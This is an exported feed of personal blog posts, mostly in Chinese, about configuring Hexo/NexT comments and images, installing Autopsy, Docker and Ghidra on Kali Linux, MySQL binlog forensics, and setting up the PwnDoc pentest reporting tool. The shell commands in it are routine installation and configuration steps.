<h1 id="配置NexT"><a href="#配置NexT" class="headerlink" title="配置NexT"></a>配置NexT</h1><p>在主题配置文件中找到Valine配置项，根据自己的需要进行配置。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Valine</span></span><br><span class="line"><span class="comment"># For more information: https://valine.js.org, https://github.com/xCss/Valine</span></span><br><span class="line"><span class="attr">valine:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">appid:</span> <span class="comment"># Your leancloud application appid</span></span><br><span class="line">  <span class="attr">appkey:</span> <span class="comment"># Your leancloud application appkey</span></span><br><span class="line">  <span class="attr">notify:</span> <span class="literal">false</span> <span class="comment"># Mail notifier</span></span><br><span class="line">  <span class="attr">verify:</span> <span class="literal">false</span> <span class="comment"># Verification code</span></span><br><span class="line">  <span class="attr">placeholder:</span> <span class="string">Your</span> <span class="string">comments...</span> <span class="comment"># Comment box placeholder</span></span><br><span class="line">  <span class="attr">avatar:</span> <span class="string">monsterid</span> <span class="comment"># Gravatar style</span></span><br><span class="line">  <span class="attr">guest_info:</span> <span class="string">nick,mail,link</span> <span class="comment"># Custom comment header</span></span><br><span class="line">  <span class="attr">pageSize:</span> <span class="number">10</span> <span class="comment"># Pagination size</span></span><br><span class="line">  <span class="attr">language:</span> <span class="string">en</span> <span class="comment"># Language, available values: en, zh-cn</span></span><br><span class="line">  <span class="attr">visitor:</span> <span class="literal">true</span> <span class="comment"># Article reading statistic</span></span><br><span class="line">  <span class="attr">comment_count:</span> <span class="literal">true</span> <span class="comment"># If false, comment count will only be displayed in post page, not in home page</span></span><br><span class="line">  <span class="attr">recordIP:</span> <span class="literal">true</span> <span class="comment"># Whether to record the commenter IP</span></span><br><span class="line">  <span class="attr">serverURLs:</span> <span class="comment"># When the custom domain name is enabled, fill it in here (it will be detected automatically by default, no need to fill in)</span></span><br><span class="line">  <span class="comment">#post_meta_order: 0</span></span><br></pre></td></tr></table></figure>

<p>具体参数的含义可以查看<a href="https://valine.js.org/configuration.html">官方文档</a>.<br>这里简单说明一下：</p>
<ul>
<li>enable: true   不解释</li>
<li>appid 和 appkey, 填上之前LeanCloud中获得的对应值</li>
<li>notify: 控制邮件通知。需要配合LeanCloud的配置，详见：<a href="https://github.com/xCss/Valine/wiki/Valine-%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F%E4%B8%AD%E7%9A%84%E9%82%AE%E4%BB%B6%E6%8F%90%E9%86%92%E8%AE%BE%E7%BD%AE">https://github.com/xCss/Valine/wiki/Valine-%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F%E4%B8%AD%E7%9A%84%E9%82%AE%E4%BB%B6%E6%8F%90%E9%86%92%E8%AE%BE%E7%BD%AE</a></li>
<li>verify: 验证码服务</li>
<li>placeholder: 评论框的占位提示符，默认为”Just go go”。这里可以修改成任意你觉得有趣的话。</li>
<li>avatar: 默认为mm，具体详见：<a href="https://valine.js.org/avatar.html">https://valine.js.org/avatar.html</a></li>
<li>pageSize: 评论分页每页条数</li>
<li>language: 目前仅支持en和zh-cn。暂时还不知道如何可以让评论区的语言与文章的语言统一。</li>
<li>visitor: 是否启用阅读量统计</li>
<li>comment_count: 如果是true评论数统计会显示在主页上，false的话则评论数仅在文章页面显示。</li>
<li>recordIP: 是否记录评论者IP</li>
</ul>
<h1 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h1><p>完成配置后，执行<code>hexo cl &amp;&amp; hexo g</code>来观察效果。</p>
<p><img data-src="result.PNG" alt="最终效果"></p>
<p>Perfect! 一次成功！</p>
<p><em>评论的功能在所有页面都默认开启，我们可以通过在Front-matter中添加comments: false 来关闭评论</em></p>
<h1 id="评论管理"><a href="#评论管理" class="headerlink" title="评论管理"></a>评论管理</h1><p>通过 <a href="https://github.com/panjunwen/Valine-Admin">Valine Admin</a> 可以实现了评论邮件通知、评论管理、垃圾评论过滤等功能。支持完全自定义的邮件通知模板。<br>目前我并没有启用这个功能。毕竟几乎没有评论，也不需要集中管理。如果之后有需要添加，再更新这一部分的内容。</p>
<hr>
<h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><ul>
<li><a href="https://www.zhihu.com/question/267598518">Hexo（NexT 主题）评论系统哪个好？</a></li>
<li><a href="https://www.jianshu.com/p/3e200908b9fc">Hexo NexT主题评论功能的筛选对比</a></li>
<li><a href="https://valine.js.org/quickstart.html">Valine官方文档</a></li>
</ul>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>NexT</tag>
        <tag>Valine</tag>
      </tags>
  </entry>
  <entry>
    <title>Insert Images to an Hexo Post</title>
    <url>/en/a45b1048/</url>
    <content><![CDATA[<p>First, execute the following command to install <em>hexo-asset-image</em> plugin. </p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">npm install hexo-asset-<span class="built_in">image</span> --<span class="built_in">save</span></span><br></pre></td></tr></table></figure>

<p>Next, please head to _config.yml to <strong>enable post_asset_folder</strong>.</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>From now on, for each time <code>hexo new [layout] &lt;title&gt;</code> is executed, hexo will simoutanuously create a folder having the same name as your new post’s title. If you want to insert images to your post, just  </p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Next</tag>
      </tags>
  </entry>
  <entry>
    <title>在Kali Linux中安装磁盘镜像工具Autopsy 4</title>
    <url>/zh-CN/8768734d/</url>
    <content><![CDATA[<p>Autopsy是Kali Linux中预安装的磁盘镜像分析&#x2F;取证软件。Autopsy基于The Sleuth Kit的开源电子取证工具。Autopsy在The Sleuth Kit的基础上增加了图形界面，大大增加了易用性。  </p>
<p>那么问题来了：Kali明明都自带了那么还要装一遍做甚？！原因是这样的：截止到现在的最新版（Kali 2019.4），Kali自带的Autopsy均是Autopsy 2. Autopsy 2通过Web服务器-客户端的形式来呈现用户界面，但是使用起来其实存在不少的限制，无论是功能还是界面都存在着不足。看下图感受一下：</p>
<p><img data-src="autopsy.jpeg" alt="Autopsy 2 用户界面"></p>
<p>而从Autopsy 3起, 程序移植成为了基于Java的应用程序。而Autopsy 4则在Autopsy 3的基础上，提升了多人协作的能力。</p>
<p><img data-src="Autopsy4.png" alt="Autopsy 4 用户界面"></p>
<p>不难发现，Autopsy 4无论从用户界面，还是软件的功能性来说，都相较于Autopsy 2有了明显的提升。然而，关于Autopsy 4的中文文档却相当的不足。所以，通过这篇博文来记录安装的各个步骤以及遇到的问题。</p>
<span id="more"></span>


<h1 id="Autopsy下载"><a href="#Autopsy下载" class="headerlink" title="Autopsy下载"></a>Autopsy下载</h1><p>在<a href="https://www.autopsy.com/download">Autopsy首页</a> 下载。页面仅支持英语与日语。</p>
<p><img data-src="Download.png" alt="Autopsy 4 下载"></p>
<p>点击 <strong>ZIP file</strong> 链接，下载Autopsy的Linux安装包。</p>
<p>点击 <strong>Java .deb Debian package</strong> 链接，下载 The Sleuth Kit Java库安装包。</p>
<h1 id="安装依赖文件"><a href="#安装依赖文件" class="headerlink" title="安装依赖文件"></a>安装依赖文件</h1><p>以下这些步骤，仅需要在第一次安装Autopsy时执行。如果Autopsy已经存在，但你依旧希望安装其他的版本，那这些步骤不需要再执行一遍。</p>
<h2 id="安装-testdisk"><a href="#安装-testdisk" class="headerlink" title="安装 testdisk"></a>安装 testdisk</h2><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span> install testdisk</span><br></pre></td></tr></table></figure>

<h2 id="安装-BellSoft-Java-8-JRE-和-JavaFX-8-发行版"><a href="#安装-BellSoft-Java-8-JRE-和-JavaFX-8-发行版" class="headerlink" title="安装 BellSoft Java 8 JRE 和 JavaFX 8 发行版"></a>安装 BellSoft Java 8 JRE 和 JavaFX 8 发行版</h2><ul>
<li>安装 BellSoft Java 8</li>
</ul>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">wget -q -O - https:<span class="regexp">//</span>download.bell-sw.com<span class="regexp">/pki/</span>GPG-KEY-bellsoft | sudo apt-key add -</span><br><span class="line">echo <span class="string">&quot;deb [arch=amd64] https://apt.bell-sw.com/ stable main&quot;</span> | sudo tee <span class="regexp">/etc/</span>apt<span class="regexp">/sources.list.d/</span>bellsoft.list</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install bellsoft-java8-full</span><br></pre></td></tr></table></figure>

<ul>
<li>配置JAVA 环境变量</li>
</ul>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">export JAVA_HOME=<span class="regexp">/usr/</span>lib<span class="regexp">/jvm/</span>bellsoft-java8-full-amd64</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：可能需要注销并重新登录使JAVA环境变量配置生效</p>
</blockquote>
<ul>
<li>确认当前运行的JAVA版本</li>
</ul>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">richard</span>@richard-Kali:~$ java -version</span><br><span class="line"><span class="attribute">Picked</span> up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=<span class="literal">on</span> -Dswing.aatext=true</span><br><span class="line"><span class="attribute">openjdk</span> version <span class="string">&quot;1.8.0_242&quot;</span></span><br><span class="line"><span class="attribute">OpenJDK</span> Runtime Environment (build <span class="number">1</span>.<span class="number">8</span>.<span class="number">0</span>_242-b07)</span><br><span class="line"><span class="attribute">OpenJDK</span> <span class="number">64</span>-Bit Server VM (build <span class="number">25</span>.<span class="number">242</span>-b07, mixed mode)</span><br></pre></td></tr></table></figure>

<h2 id="安装The-Sleuth-Kit-Java库"><a href="#安装The-Sleuth-Kit-Java库" class="headerlink" title="安装The Sleuth Kit Java库"></a>安装The Sleuth Kit Java库</h2><p>Autopsy 4 依赖于特定版本的 The Sleuth Kit。所以我们需要安装基于特定Java版本的Sleuth Kit安装包：</p>
<p>使用我们在第0步下载获得的sleuthkit-java_4.8.0-1_amd64.deb (具体文件名可能根据版本发生变化)。</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo</span> apt install ./sleuthkit-java_4.<span class="number">8</span>.<span class="number">0</span>-<span class="number">1</span>_amd64.deb</span><br></pre></td></tr></table></figure>

<h2 id="安装Autopsy-4"><a href="#安装Autopsy-4" class="headerlink" title="安装Autopsy 4"></a>安装Autopsy 4</h2><p>解压下载的Autopsy 压缩包。通过<code>cd</code>命令进入Autopsy目录。</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">cd</span> autopsy-<span class="number">4</span>.<span class="number">14</span>.<span class="number">0</span>/</span><br></pre></td></tr></table></figure>

<p>执行<code>unix_setup.sh</code>来完成Autopsy配置。</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">sh</span> unix_setup.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure>

<h2 id="执行Autopsy-4"><a href="#执行Autopsy-4" class="headerlink" title="执行Autopsy 4"></a>执行Autopsy 4</h2><p>进入<code>bin</code>目录，执行</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">./<span class="built_in">auto</span>psy</span><br></pre></td></tr></table></figure>

<p>此时，Autopsy 4应该可以顺利执行了。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li><a href="https://sleuthkit.org/">https://sleuthkit.org</a></li>
<li><a href="https://github.com/sleuthkit/autopsy">https://github.com/sleuthkit/autopsy</a></li>
</ul>
]]></content>
      <categories>
        <category>Security</category>
        <category>Linux</category>
        <category>Forensics</category>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>AutoPsy</tag>
        <tag>Installation</tag>
      </tags>
  </entry>
  <entry>
    <title>在Kali Linux中安装Docker (Kali 2019.4)</title>
    <url>/zh-CN/1e3c141b/</url>
    <content><![CDATA[<p>这篇文章主要是简单记录一下在Kali中安装Docker的完整过程。下文提及的所有步骤都在Kali的最新版本(2019.4)中成功执行。</p>
<h1 id="为嘛要在Kali中装Docker呐？！"><a href="#为嘛要在Kali中装Docker呐？！" class="headerlink" title="为嘛要在Kali中装Docker呐？！"></a>为嘛要在Kali中装Docker呐？！</h1><p>这是一个很常见的问题。因为大家都认为Kali是一个非常纯粹的渗透测试工具，在Kali中安装了Docker就多少显得……不那么Cool了对吧！  </p>
<p>其实不然。Kali有如今的地位，是因为他包含了一系列对于网络安全工作非常实用的工具。但是，如果你突然想要在Kali中运行一个Kali中没有的工具，这个工具又对于环境有不少的要求，那么这时候，最简单的方法就是通过Docker容器来运行这个工具。<br>使用Docker可以让我们毫无顾虑地运行所以工具，而不用担心这个工具会破坏Kali原有的环境，引起冲突。  </p>
<p>这就是我们在Kali中安装上Docker的根本原因。</p>
<h1 id="准备步骤"><a href="#准备步骤" class="headerlink" title="准备步骤"></a>准备步骤</h1><p>开始前先将Kali中的软件进行更新。</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">richard<span class="variable">@richard</span>-<span class="symbol">Kali:</span>~<span class="variable">$ </span>sudo apt update</span><br><span class="line">richard<span class="variable">@richard</span>-<span class="symbol">Kali:</span>~<span class="variable">$ </span>sudo apt dist-upgrade</span><br></pre></td></tr></table></figure>

<p>添加Docker PGP 密钥：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">richard@richard-Kali:~$ curl -fsSL https:<span class="regexp">//</span>download.docker.com<span class="regexp">/linux/</span>debian/gpg | sudo apt-key add -</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<p>配置Docker APT仓库 (Kali 基于 Debian, 可以使用Debian buster这个版本) 。打开<code>/etc/apt/sources.list.d/docker.list</code>，并添加：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">deb [arch=amd64] https:<span class="regexp">//</span>download.docker.com<span class="regexp">/linux/</span>debian buster stable</span><br></pre></td></tr></table></figure>

<p>对于国内的用户，由于官方的下载源速度感人，所以建议换成国内的镜像：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">deb [arch=amd64] https:<span class="regexp">//mi</span>rrors.ustc.edu.cn<span class="regexp">/docker-ce/</span>linux/debian buster stable</span><br><span class="line">deb [arch=amd64] https:<span class="regexp">//mi</span>rrors.tuna.tsinghua.edu.cn<span class="regexp">/docker-ce/</span>linux/debian buster stable</span><br></pre></td></tr></table></figure>

<p>对于国内的用户，由于官方的下载源速度感人，所以建议换成国内的镜像：</p>
<p>再update一下APT:</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">richard<span class="variable">@richard</span>-<span class="symbol">Kali:</span>~<span class="variable">$ </span>sudo apt update</span><br></pre></td></tr></table></figure>

<h1 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h1><figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">richard<span class="variable">@richard</span>-<span class="symbol">Kali:</span>~<span class="variable">$ </span>sudo apt install docker-ce</span><br></pre></td></tr></table></figure>

<p>安装完成后，进行一个简单的测试：</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">richard<span class="symbol">@richard</span>-Kali:~$ docker <span class="built_in">run</span> hello-world</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：Docker服务在正确安装后会被自动启动(start)，但不会被启用(enable)。也就是说，系统重新启动以后Docker不会自动启动。</p>
</blockquote>
<p>需要启用Docker的话，则执行命令</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">richard<span class="variable">@richard</span>-<span class="symbol">Kali:</span>~<span class="variable">$ </span>systemctl enable docker</span><br></pre></td></tr></table></figure>




<h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><ul>
<li><a href="https://docs.docker.com/">https://docs.docker.com</a></li>
<li><a href="https://medium.com/@airman604/installing-docker-in-kali-linux-2017-1-fbaa4d1447fe">https://medium.com/@airman604/installing-docker-in-kali-linux-2017-1-fbaa4d1447fe</a></li>
<li><a href="https://mirrors.tuna.tsinghua.edu.cn/help/docker-ce/">https://mirrors.tuna.tsinghua.edu.cn/help/docker-ce/</a></li>
<li><a href="https://mirrors.ustc.edu.cn/help/docker-ce.html">https://mirrors.ustc.edu.cn/help/docker-ce.html</a></li>
</ul>
]]></content>
      <categories>
        <category>Security</category>
        <category>Tools</category>
        <category>Linux</category>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Kali</tag>
        <tag>Docker</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>在Kali Linux中安装Ghidra</title>
    <url>/zh-CN/b13d8a67/</url>
    <content><![CDATA[<span id="more"></span>


<h1 id="Ghidra介绍"><a href="#Ghidra介绍" class="headerlink" title="Ghidra介绍"></a>Ghidra介绍</h1><p>Ghidra是一个由美国国家安全局(NSA)开发的软件逆向(SRE)工具集。NSA在2019年正式开源了这款工具。由于免费开源的特性，这款工具很快获得了安全从业人员的大量关注。</p>
<h1 id="下载Ghidra"><a href="#下载Ghidra" class="headerlink" title="下载Ghidra"></a>下载Ghidra</h1><p>我们可以直接从<a href="https://ghidra-sre.org/">Ghidra官网</a>下载最新版的Ghidra。</p>
<p>或者直接执行命令(根据实际情况修改链接中的版本号与版本日期):</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">wget</span> https://ghidra-sre.org/ghidra_9.<span class="number">1</span>.<span class="number">1</span>_PUBLIC_20191218.zip </span><br></pre></td></tr></table></figure>

<h2 id="解决访问Ghidra官网403的问题"><a href="#解决访问Ghidra官网403的问题" class="headerlink" title="解决访问Ghidra官网403的问题"></a>解决访问Ghidra官网403的问题</h2><p>但是我在尝试下载时遇到了下述错误：</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">richard@richard-Kali:~/Downloads$ wget https://ghidra-sre.org/ghidra_9.<span class="number">1</span>.<span class="number">1</span>_PUBLIC_<span class="number">20191218</span>.zip</span><br><span class="line">--<span class="number">2020-01-15</span> <span class="number">11</span>:<span class="number">37</span>:<span class="number">34</span>--  https://ghidra-sre.org/ghidra_9.<span class="number">1</span>.<span class="number">1</span>_PUBLIC_<span class="number">20191218</span>.zip</span><br><span class="line">Resolving ghidra-sre.org (ghidra-sre.org)... <span class="number">13.35.99.82</span>, <span class="number">13.35.99.69</span>, <span class="number">13.35.99.72</span>, ...</span><br><span class="line">Connecting to ghidra-sre.org (ghidra-sre.org)|<span class="number">13.35.99.82</span>|:<span class="number">443</span>... connected.</span><br><span class="line">HTTP request sent, awaiting response... <span class="number">403</span> Forbidden</span><br><span class="line"><span class="number">2020-01-15</span> <span class="number">11</span>:<span class="number">37</span>:<span class="number">37</span> ERROR <span class="number">403</span>: Forbidden.</span><br></pre></td></tr></table></figure>

<p>在浏览器中直接访问，也同样报403.<br><img data-src="403_error.png" alt="浏览器报错信息"></p>
<p>造成这个的原因是部分国家的IP地址被Cloudfront屏蔽了。。已知的国家有俄罗斯，以色列，中国等…这个既不是GFW造成的，也不是NSA故意要屏蔽。所以，相对而言还是比较容易绕过这个IP的限制。</p>
<p>当然，也可以从国内的文件分享平台上下载。不过，下载后请务必验证文件的完整性。<br>截止到版本9.1.1,所有版本的Hash信息如下表所示。</p>
<p><img data-src="Ghidra_release_note.PNG" alt="Ghidra版本信息"></p>
<p>对下载的文件进行完整性校验。</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">richard</span>@richard-Kali:~/Downloads$ sha256sum ghidra_9.<span class="number">1</span>.<span class="number">1</span>_PUBLIC_20191218.zip </span><br><span class="line"><span class="attribute">b0d40a4497c66011084e4a639d61ac76da4b4c5cabd62ab63adadb7293b0e506</span>  ghidra_9.<span class="number">1</span>.<span class="number">1</span>_PUBLIC_20191218.zip</span><br><span class="line"><span class="attribute">richard</span>@richard-Kali:~/Downloads$ </span><br></pre></td></tr></table></figure>

<h1 id="安装Ghidra"><a href="#安装Ghidra" class="headerlink" title="安装Ghidra"></a>安装Ghidra</h1><p>首先将下载的压缩包解压。</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">richard</span>@richard-Kali:~/Downloads$ unzip ghidra_9.<span class="number">1</span>.<span class="number">1</span>_PUBLIC_20191218.zip</span><br></pre></td></tr></table></figure>

<p>再安装Java jdk 和 jre。</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">sudo apt <span class="keyword">install </span>openjdk<span class="number">-11</span>-<span class="keyword">jdk</span></span><br><span class="line"><span class="keyword"></span>sudo apt <span class="keyword">install </span>openjdk<span class="number">-11</span>-<span class="keyword">jre-headless</span></span><br></pre></td></tr></table></figure>

<h1 id="运行Ghidra"><a href="#运行Ghidra" class="headerlink" title="运行Ghidra"></a>运行Ghidra</h1><p>上述步骤全部完成后，应该就能顺利运行Ghidra了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./ghidraRun</span><br></pre></td></tr></table></figure>
<p><img data-src="run.png" alt="成功运行"></p>
]]></content>
      <categories>
        <category>Security</category>
        <category>Linux</category>
        <category>Kali</category>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>Kali</tag>
        <tag>Linux</tag>
        <tag>Ghidra</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL Binlog 调查取证</title>
    <url>/zh-CN/82b8fc5e/</url>
    <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>最近，公司有一个客户的MySQL数据库被篡改了数据，因此需要对该客户被攻击的服务器进行调查。其中涉及到对MySQL的Binlog日志分析。在任务完成后，将其中相关的步骤进行总结。</p>
<h1 id="Binlog"><a href="#Binlog" class="headerlink" title="Binlog"></a>Binlog</h1><h2 id="定位-Binlog-位置"><a href="#定位-Binlog-位置" class="headerlink" title="定位 Binlog 位置"></a>定位 Binlog 位置</h2><p>找到MySQL安装目录中bin目录的位置，同时确认binlog的储存位置。其相应的配置在my.cnf的log_bin&#x3D;””中。<br>如果能够使用mySQL命令行连接，也可以使用 <code>showvariables like &#39;%log_bin%&#39;</code>命令查看binlog的相关配置。</p>
<span id="more"></span>

<h2 id="Binlog-结构"><a href="#Binlog-结构" class="headerlink" title="Binlog 结构"></a>Binlog 结构</h2><p>在binlog所在的数据目录(默认为data目录)，可以看到mysql-bin.index 及 mysql-bin.0000xx 文件。其中.index文件为索引文件，记录数据文件列表。每当数据库重启或者当前一个文件写满后会生成新文件，同时使用命令<code>flush logs</code>也可以重新生成新的binlog日志文件。<code>reset master</code>命令可以用于清空binlog日志文件。</p>
<h2 id="Binlog-格式"><a href="#Binlog-格式" class="headerlink" title="Binlog 格式"></a>Binlog 格式</h2><p>Binlog的格式有三个选项：<br>    - Row<br>    - Statement<br>    - Mixed<br>简单介绍这三种格式，分别为：<br>    - Row: 默认格式，记录导致表的行发生变化的事件<br>    - Statement: 记录被执行的原始SQL查询语句<br>    - Mixed: 默认使用Statement格式，再特定情况下使用Row格式<br>Binlog格式可以在my.cnf的binlog-format&#x3D;中进行配置。在MySQL命令行中可以通过<code>SHOW VARIABLES LIKE &#39;binlog_format&#39;;</code>查看。</p>
<h2 id="Binlog-内容"><a href="#Binlog-内容" class="headerlink" title="Binlog 内容"></a>Binlog 内容</h2><p>由于binlog是以二进制格式储存的，所以无法直接查看。MySQL自带的mysqlbinlog工具可以用来查看binlog。<code>[MySQL directory]\bin\mysqlbinlog mysql-bin.000008</code>即可获取binlog中的内容。当然也可以添加参数(–start-porition, –stop-position, –start-time, –stop-time)来筛选日志。在很多事件调查中，其实都可以将目标时间确定在一个范围之内，因此使用参数进行筛选会给我们带来极大的便利。<br>对于Row格式的Binlog，还可以使用-v参数将日志记录转译为”伪-SQL语句”。</p>
<hr>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p><a href="https://cloud.tencent.com/developer/article/1032755">https://cloud.tencent.com/developer/article/1032755</a><br><a href="https://maxchadwick.xyz/blog/working-with-mysql-binary-logs">https://maxchadwick.xyz/blog/working-with-mysql-binary-logs</a></p>
]]></content>
      <categories>
        <category>Security</category>
        <category>Forensics</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
        <tag>Binlog</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试报告自动化工具PwnDoc(一)</title>
    <url>/zh-CN/4398caef/</url>
    <content><![CDATA[<p>PwnDoc是一个渗透测试报告的自动化工具，旨在帮助渗透测试工程师可以更简单快速地根据所有的发现项，生成一个可定制化的Docx格式的报告。<br>PwnDoc的主要目标很简单：花更多的时间来<em>Pwn</em>,花更少的时间来<em>Doc</em>.</p>
<span id="more"></span>


<h1 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h1><p>PwnDoc需要使用到3个容器：前端，后端与数据库。<br>3个容器可以通过docker-compose同时运行。</p>
<p>首先下载项目源码</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/pwndoc/</span>pwndoc</span><br></pre></td></tr></table></figure>

<p>进入项目根目录，运行Docker容器</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">docker-compose up -d <span class="comment">--build</span></span><br></pre></td></tr></table></figure>
<p><img data-src="installation_0.png"></p>
<p>如果在程序在<code>npm install</code>那一步出现报错，可能是由于与官方镜像源连接过程中的网络问题。<br>可以尝试修改<code>backend/Dockerfile</code>和<code>frontend/Dockerfile</code>中的</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">RUN</span> npm install</span><br></pre></td></tr></table></figure>
<p>替换为</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">RUN npm --registry https:<span class="regexp">//</span>registry.npm.taobao.org install</span><br></pre></td></tr></table></figure>

<p>但是在npm安装Electron的时候，又再次遇到了下载问题<br><img data-src="installation_1.png"><br>一翻搜索以后发现了这篇文章详细解释了具体的原因：<br><a href="https://cloud.tencent.com/developer/article/1722304">https://cloud.tencent.com/developer/article/1722304</a></p>
<p>于是相应地再做些修改</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">RUN ELECTRON_MIRROR=<span class="string">&quot;https://npm.taobao.org/mirrors/electron/&quot;</span> npm --registry https:<span class="regexp">//</span>registry.npm.taobao.org install</span><br></pre></td></tr></table></figure>

<p>这下可以顺利安装了！<br><img data-src="installation_2.png"></p>
<p>安装完成后，可以直接通过<a href="https://localhost:8443访问应用。">https://localhost:8443访问应用。</a></p>
<p><img data-src="installation_3.png"></p>
<p>需要进行升级的话：</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">docker-compose <span class="meta">down</span></span><br><span class="line">git pull</span><br><span class="line">docker-compose <span class="meta">up</span> -d --build</span><br></pre></td></tr></table></figure>

<h1 id="备份方法"><a href="#备份方法" class="headerlink" title="备份方法"></a>备份方法</h1><p>使用PwnDoc的过程中，最好可以经常备份<code>backend/mongo-data</code>目录。所有的数据库都包含在这个文件家中。</p>
<p>备份恢复方法：</p>
<ul>
<li>终止容器<code>docker-compose stop</code></li>
<li>将备份的文件进行替换</li>
<li>重新启动容器<code>docker-compose start</code></li>
</ul>
<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p>在开始使用这个工具前，有几个配置是一定要先定义好的。</p>
<h2 id="基本配置"><a href="#基本配置" class="headerlink" title="基本配置"></a>基本配置</h2><h3 id="协作者-Collaborators"><a href="#协作者-Collaborators" class="headerlink" title="协作者 Collaborators"></a>协作者 Collaborators</h3><p>这个工具是个多人协作工具，所以这边其实相当于是这个工具的用户管理界面。同样的有三种用户权限可以选择：user, report, admin.</p>
<h3 id="公司-Companies"><a href="#公司-Companies" class="headerlink" title="公司 Companies"></a>公司 Companies</h3><p>可以定义渗透测试目标系统所属的公司的名称以及logo。</p>
<h3 id="语言设置"><a href="#语言设置" class="headerlink" title="语言设置"></a>语言设置</h3><p>PwnDoc可以对多种语言进行设定，适用于<em>自定义数据</em>和<em>漏洞说明</em>部分。<br>这里我设置了英语与中文两种。实际用到的比较多的是英语。<br><img data-src="Data_Language.png"></p>
<h2 id="导入漏洞列表"><a href="#导入漏洞列表" class="headerlink" title="导入漏洞列表"></a>导入漏洞列表</h2><p>PwnDoc支持从外部直接导入漏洞。导入入口如下：</p>
<p><img data-src="vulnerabilities_0.png"></p>
<p>导入的文件需要符合Serpico使用的格式。我在网上找到一个还算比较完整的模板：<a href="https://github.com/ministryofjustice/serpico-templates/tree/master/template_findings">https://github.com/ministryofjustice/serpico-templates/tree/master/template_findings</a></p>
<p>当然一项一项逐个导入，可能比较费事费力。所以我做了一下文件处理，将他们全部合并到了同一个文件中：<br><a href="https://github.com/UPWNothing/SecurityDataset/blob/master/Vulnerabilities/merged.json">https://github.com/UPWNothing/SecurityDataset/blob/master/Vulnerabilities/merged.json</a></p>
<p>成功导入后可以在Vulnerabilities标签页中看到导入的所有漏洞。当然，如果要实际使用的话，还需要手动进行一定程度的配置。</p>
<h2 id="导入报告模板"><a href="#导入报告模板" class="headerlink" title="导入报告模板"></a>导入报告模板</h2><p>在可以正式开始使用之前，需要先导入报告模板。</p>
<p>报告模板中的格式定义可以参照这个官方的参考模板：<a href="http://github.com/pwndoc/pwndoc/tree/master/backend/report-templates">http://github.com/pwndoc/pwndoc/tree/master/backend/report-templates</a></p>
<p>看了这个模板以后，可以比较详细地理解各个变量应该在报告中如何使用了。</p>
<p>之后有时间的话，会再写一篇详细说一下如何更好地编排渗透测试模板。</p>
